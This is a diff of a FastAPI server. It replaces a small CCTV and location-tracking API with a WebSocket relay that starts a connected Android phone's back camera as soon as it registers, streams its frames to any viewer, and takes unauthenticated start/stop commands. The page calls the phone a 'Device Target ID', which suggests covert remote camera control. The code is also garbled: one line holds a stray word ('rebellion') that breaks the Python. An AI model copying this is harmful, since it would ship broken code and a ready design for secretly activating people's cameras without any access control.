@@ -1,198 +1,234 @@
-from fastapi import FastAPI, HTTPException, Body
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
-from typing import List, Dict, Optional
-from datetime import datetime
+from typing import Dict, List
+import json
+import asyncio
 
 app = FastAPI(
-    title="Vercel + FastAPI CCTV & Tracker",
-    description="Camera Connection and Real-time Location Tracking API",
-    version="1.0.0",
+    title="CCTV Stream & Control Server",
+    description="Real-time WebSocket server for Android Camera Stream and Tracking",
+    version="2.0.0"
 )
 
-# --- IN-MEMORY DATABASE (Temporary Storage for Vercel Serverless) ---
-cameras_db = {
-    "cam-01": {
-        "id": "cam-01", 
-        "name": "Main Gate Camera", 
-        "status": "online", 
-        "stream_url": "https://sample.vodobox.net/skate_phantom_flex_4k/skate_phantom_flex_4k.m3u8", 
-        "updated_at": datetime.now().isoformat()
-    }
-}
+# --- CONNECTION MANAGER FOR APPS & VIEWERS ---
+class ConnectionManager:
+    def __init__(self):
+        # active_cameras: { camera_id: WebSocket_of_Android_App }
+        self.active_cameras: Dict[str, WebSocket] = {}
+        # viewers: { camera_id: [List_of_Viewer_WebSockets] }
+        self.viewers: Dict[str, List[WebSocket]] = {}
+        # metadata: { camera_id: { "model": ..., "status": ... } }
+        self.camera_metadata: Dict[str, dict] = {}
 
-locations_db = {
-    "loc-01": {
-        "id": "loc-01", 
-        "username": "Rohan_Sharma", 
-        "latitude": 28.6139, 
-        "longitude": 77.2090, 
-        "updated_at": datetime.now().isoformat()
-    }
-}
+    async def register_camera(self, camera_id: str, websocket: WebSocket, model: str):
+        self.active_cameras[camera_id] = websocket
+        self.camera_metadata[camera_id] = {
+            "id": camera_id,
+            "device_model": model,
+            "status": "online"
+        }
+        if camera_id rebellion not in self.viewers:
+            self.viewers[camera_id] = []
+        print(f"📷 Camera Registered: {camera_id} ({model})")
 
+    def disconnect_camera(self, camera_id: str):
+        if camera_id in self.active_cameras:
+            del self.active_cameras[camera_id]
+        if camera_id in self.camera_metadata:
+            self.camera_metadata[camera_id]["status"] = "offline"
+        print(f"❌ Camera Disconnected: {camera_id}")
 
-# --- PYDANTIC MODELS FOR VALIDATION ---
-class CameraConnectModel(BaseModel):
-    id: str
-    name: str
-    status: str = "online"
-    stream_url: Optional[str] = None
+    async def register_viewer(self, camera_id: str, websocket: WebSocket):
+        if camera_id not in self.viewers:
+            self.viewers[camera_id] = []
+        self.viewers[camera_id].append(websocket)
+        print(f"👀 New Viewer added for Camera: {camera_id}")
 
-class LocationUpdateModel(BaseModel):
-    id: str
-    username: str
-    latitude: float
-    longitude: float
+    def disconnect_viewer(self, camera_id: str, websocket: WebSocket):
+        if camera_id in self.viewers and websocket in self.viewers[camera_id]:
+            self.viewers[camera_id].remove(websocket)
+            print(f"👀 Viewer disconnected from Camera: {camera_id}")
 
+    async def broadcast_frame(self, camera_id: str, frame_bytes: bytes):
+        if camera_id in self.viewers:
+            disconnected_viewers = []
+            for viewer in self.viewers[camera_id]:
+                try:
+                    await viewer.send_bytes(frame_bytes)
+                except Exception:
+                    disconnected_viewers.append(viewer)
+            
+            for v in disconnected_viewers:
+                self.disconnect_viewer(camera_id, v)
 
-# ==========================================
-# FEATURE 1: CAMERA / CCTV ENDPOINTS
-# ==========================================
+    async def send_command(self, camera_id: str, command: dict):
+        if camera_id in self.active_cameras:
+            app_ws = self.active_cameras[camera_id]
+            await app_ws.send_text(json.dumps(command))
+            return True
+        return False
 
-# 1. Camera Access Point - App ya Device ko connect karne ke liye
-@app.post("/camera", tags=["Camera"])
-def connect_camera(camera: CameraConnectModel):
-    cameras_db[camera.id] = {
-        "id": camera.id,
-        "name": camera.name,
-        "status": camera.status,
-        "stream_url": camera.stream_url or f"http://local-stream-ip/live/{camera.id}",
-        "updated_at": datetime.now().isoformat()
-    }
-    return {"status": "success", "message": "Camera access established successfully", "data": cameras_db[camera.id]}
-
-
-# 2. Camera Info & Live Status - Saare connections aur status manage karne ke liye
-@app.get("/camera/info", tags=["Camera"])
-def get_all_cameras_info():
-    total_cameras = len(cameras_db)
-    online_count = sum(1 for cam in cameras_db.values() if cam["status"] == "online")
-    
-    return {
-        "total_managed_cameras": total_cameras,
-        "live_online_count": online_count,
-        "connections": list(cameras_db.values())
-    }
-
-
-# 3. View Live CCTV by ID - Specific camera ka live access lene ke liye
-@app.get("/camera/{camera_id}", tags=["Camera"])
-def get_live_camera(camera_id: str):
-    if camera_id not in cameras_db:
-        raise HTTPException(status_code=404, detail=f"Camera with ID '{camera_id}' not found.")
-    
-    camera_data = cameras_db[camera_id]
-    return {
-        "camera_id": camera_data["id"],
-        "name": camera_data["name"],
-        "connection_status": camera_data["status"],
-        "live_stream_url": camera_data["stream_url"],
-        "instruction": "Embed this stream_url into your app player to watch live CCTV."
-    }
+manager = ConnectionManager()
 
 
 # ==========================================
-# FEATURE 2: REAL-TIME LOCATION ENDPOINTS
+# 1. ANDROID APP CONNECTION ENDPOINT (WebSocket)
 # ==========================================
+@app.websocket("/ws")
+async def android_app_websocket(websocket: WebSocket):
+    await websocket.accept()
+    camera_id = None
+    try:
+        # First Packet standard authentication routine handle karein
+        first_msg = await websocket.receive_text()
+        data = json.loads(first_msg)
+        
+        if data.get("type") == "register_app":
+            auth_key = data.get("authKey", "NONE")
+            model = data.get("deviceModel", "UNKNOWN")
+            
+            # Agar auth key 'NONE' hai toh default fallback device model ko bana lein
+            camera_id = auth_key if auth_key != "NONE" else model
+            await manager.register_camera(camera_id, websocket, model)
+            
+            # Auto start instruction send karein connect hote hi
+            await manager.send_command(camera_id, {"action": "START_CAM", "cameraFacing": "BACK"})
+        else:
+            await websocket.close(code=4003, reason="Auth failed")
+            return
 
-# 1. Post Real-Time Location - User ki real-time location capture karne ke liye
-@app.post("/location", tags=["Location"])
-def update_user_location(location: LocationUpdateModel):
-    locations_db[location.id] = {
-        "id": location.id,
-        "username": location.username,
-        "latitude": location.latitude,
-        "longitude": location.longitude,
-        "updated_at": datetime.now().isoformat()
-    }
-    return {"status": "success", "message": "Real-time location captured", "data": locations_db[location.id]}
+        # Continuous Frame Receiver Loop
+        while True:
+            # Android app se direct byte frames receive honge
+            frame_bytes = await websocket.receive_bytes()
+            # Un bytes ko active web viewers tak turant forward karein
+            await manager.broadcast_frame(camera_id, frame_bytes)
 
-
-# 2. Location Info & Management - Pure tracking system ka status dashboard
-@app.get("/location-info", tags=["Location"])
-def get_location_system_info():
-    return {
-        "system_status": "Active",
-        "total_tracked_devices": len(locations_db),
-        "all_tracked_locations": list(locations_db.values())
-    }
-
-
-# 3. View Location by ID - Kisi specific user/device ki location dekhne ke liye
-@app.get("/location/{location_id}", tags=["Location"])
-def get_location_by_id(location_id: str):
-    if location_id not in locations_db:
-        raise HTTPException(status_code=404, detail=f"Location record '{location_id}' not found.")
-    return locations_db[location_id]
+    except WebSocketDisconnect:
+        if camera_id:
+            manager.disconnect_camera(camera_id)
+    except Exception as e:
+        print(f"Error in App WebSocket: {e}")
+        if camera_id:
+            manager.disconnect_camera(camera_id)
 
 
 # ==========================================
-# HOME PAGE HTML RESPONSE
+# 2. WEB VIEWERS STREAM ENDPOINT (WebSocket)
 # ==========================================
-@app.get("/", response_class=HTMLResponse)
-def read_root():
-    return """
+@app.websocket("/ws/viewer/{camera_id}")
+async def web_viewer_websocket(websocket: WebSocket, camera_id: str):
+    await websocket.accept()
+    await manager.register_viewer(camera_id, websocket)
+    try:
+        while True:
+            # Client connection alive rakhne ke liye ping-pong listener
+            await websocket.receive_text()
+    except WebSocketDisconnect:
+        manager.disconnect_viewer(camera_id, websocket)
+
+
+# ==========================================
+# 3. LIVE STREAM DASHBOARD (HTML UI)
+# ==========================================
+@app.get("/camera/{camera_id}", response_class=HTMLResponse)
+async def view_live_camera(camera_id: str):
+    return f"""
     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>FastAPI CCTV & Tracker Hub</title>
+        <title>Live CCTV Feed - {camera_id}</title>
         <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body { font-family: -apple-system, system-ui, sans-serif; background-color: #000; color: #fff; min-height: 100vh; display: flex; flex-direction: column; }
-            nav { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; padding: 1.5rem 2rem; width: 100%; border-bottom: 1px solid #222; }
-            .logo { font-size: 1.25rem; font-weight: 700; color: #fff; text-decoration: none; }
-            .nav-links { margin-left: auto; display: flex; gap: 1rem; }
-            .nav-links a { color: #888; text-decoration: none; font-size: 0.9rem; padding: 0.5rem 1rem; border-radius: 6px; transition: 0.2s; }
-            .nav-links a:hover { color: #fff; background: #111; }
-            main { flex: 1; max-width: 1200px; margin: 0 auto; padding: 3rem 2rem; text-align: center; width: 100%; }
-            h1 { font-size: 2.5rem; margin-bottom: 0.5rem; background: linear-gradient(to right, #fff, #666); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-            p.subtitle { color: #888; margin-bottom: 3rem; }
-            .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; }
-            .card { background: #111; border: 1px solid #222; border-radius: 12px; padding: 1.5rem; text-align: left; transition: 0.2s; }
-            .card:hover { border-color: #444; transform: translateY(-2px); }
-            .card h3 { font-size: 1.1rem; margin-bottom: 0.5rem; color: #00ff88; }
-            .card p { color: #888; font-size: 0.85rem; margin-bottom: 1.5rem; line-height: 1.4; }
-            .card a { display: block; text-align: center; color: #fff; background: #222; text-decoration: none; font-size: 0.85rem; font-weight: 600; padding: 0.6rem; border-radius: 6px; border: 1px solid #333; }
-            .card a:hover { background: #333; }
-            .badge { display: inline-flex; align-items: center; gap: 0.4rem; background: #0070f3; padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.75rem; margin-bottom: 1.5rem; }
-            .dot { width: 6px; height: 6px; background: #00ff88; border-radius: 50%; }
+            body {{ font-family: sans-serif; background: #0a0a0a; color: #fff; text-align: center; padding: 20px; }}
+            .container {{ max-width: 600px; margin: 0 auto; background: #111; padding: 20px; border-radius: 12px; border: 1px solid #333; }}
+            img {{ width: 100%; max-height: 450px; background: #000; border-radius: 8px; margin-top: 15px; border: 1px solid #444; }}
+            .btn {{ display: inline-block; padding: 10px 20px; margin: 10px 5px; background: #222; color: #fff; border: 1px solid #444; cursor: pointer; border-radius: 6px; font-weight: bold; text-decoration: none; }}
+            .btn:hover {{ background: #333; }}
+            .btn-start {{ border-color: #00ff88; color: #00ff88; }}
+            .btn-stop {{ border-color: #ff3333; color: #ff3333; }}
+            .status {{ font-size: 14px; color: #888; margin-bottom: 10px; }}
         </style>
     </head>
     <body>
-        <nav>
-            <a href="/" class="logo">📡 CCTV & Tracker Hub</a>
-            <div class="nav-links">
-                <a href="/docs" target="_blank">Interactive Docs UI</a>
-                <a href="/camera/info">Live Camera Info</a>
-                <a href="/location-info">Tracker Dashboard</a>
-            </div>
-        </nav>
-        <main>
-            <div class="badge"><span class="dot"></span> Systems Fully Operational</div>
-            <h1>FastAPI + Vercel Dashboard</h1>
-            <p class="subtitle">API endpoints for managing smart CCTV feeds and real-time user location tracking.</p>
+        <div class="container">
+            <h2>📷 Live CCTV Master Feed</h2>
+            <div class="status">Device Target ID: <b>{camera_id}</b></div>
             
-            <div class="cards">
-                <div class="card">
-                    <h3>📷 Swagger API Docs</h3>
-                    <p>Open the interactive UI to test real-time POST requests, view schemas, and query endpoints live.</p>
-                    <a href="/docs" target="_blank">Open Swagger UI →</a>
-                </div>
-                <div class="card">
-                    <h3>📹 CCTV Live Status</h3>
-                    <p>Check current network stream status, manage access points, and verify device health.</p>
-                    <a href="/camera/info">View Camera Info →</a>
-                </div>
-                <div class="card">
-                    <h3>📍 Location Analytics</h3>
-                    <p>Access geo-coordinates tracking logs, active users, and manage live GPS feed incoming points.</p>
-                    <a href="/location-info">View Location Logs →</a>
-                </div>
+            <div id="connection-status" style="color: #ffcc00;">Connecting to Server Tunnel...</div>
+            
+            <img id="live-stream" src="" alt="Waiting for live frame transmission..." />
+            
+            <br/><br/>
+            <div>
+                <button class="btn btn-start" onclick="controlCam('START_CAM')">Turn Camera ON</button>
+                <button class="btn btn-stop" onclick="controlCam('STOP_CAM')">Turn Camera OFF</button>
             </div>
-        </main>
+            <a href="/camera/info" class="btn">📊 View Network Info</a>
+        </div>
+
+        <script>
+            const camera_id = "{camera_id}";
+            const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
+            const wsUrl = protocol + "//" + window.location.host + "/ws/viewer/" + camera_id;
+            
+            const ws = new WebSocket(wsUrl);
+            const imgElement = document.getElementById("live-stream");
+            const statusElement = document.getElementById("connection-status");
+
+            ws.onopen = () => {{
+                statusElement.innerText = "⚡ Connection Active - Receiving Stream Data";
+                statusElement.style.color = "#00ff88";
+            }};
+
+            ws.onmessage = (event) => {{
+                // Blob conversion optimization for clean memory management
+                const blob = event.data;
+                const oldUrl = imgElement.src;
+                imgElement.src = URL.createObjectURL(blob);
+                if (oldUrl.startsWith("blob:")) {{
+                    URL.revokeObjectURL(oldUrl); // Memory leak protection
+                }}
+            }};
+
+            ws.onclose = () => {{
+                statusElement.innerText = "❌ Stream Offline / Disconnected";
+                statusElement.style.color = "#ff3333";
+            }};
+
+            async function controlCam(actionName) {{
+                // Trigger camera trigger state API directly
+                await fetch(`/api/control/${camera_id}?action=${{actionName}}`, {{method: 'POST'}});
+            }}
+        </script>
     </body>
     </html>
     """
+
+
+# ==========================================
+# 4. REMOTE CONTROL & METADATA ENDPOINTS
+# ==========================================
+@app.post("/api/control/{camera_id}", tags=["Management"])
+async def trigger_camera_action(camera_id: str, action: str):
+    """Viewers yahan se START_CAM ya STOP_CAM commands push kar sakte hain app ko"""
+    if action not in ["START_CAM", "STOP_CAM"]:
+        raise HTTPException(status_code=400, detail="Invalid Action Parameter.")
+    
+    payload = {"action": action, "cameraFacing": "BACK"}
+    success = await manager.send_command(camera_id, payload)
+    
+    if success:
+        return {"status": "success", "message": f"Command {action} transmitted successfully."}
+    raise HTTPException(status_code=404, detail="Target camera node is offline or un-registered.")
+
+
+@app.get("/camera/info", tags=["Management"])
+def get_all_managed_devices():
+    """App me dynamic status ya logs dekhne ke liye endpoint"""
+    return {
+        "active_device_count": len(manager.active_cameras),
+        "devices_registry": list(manager.camera_metadata.values())
+    }
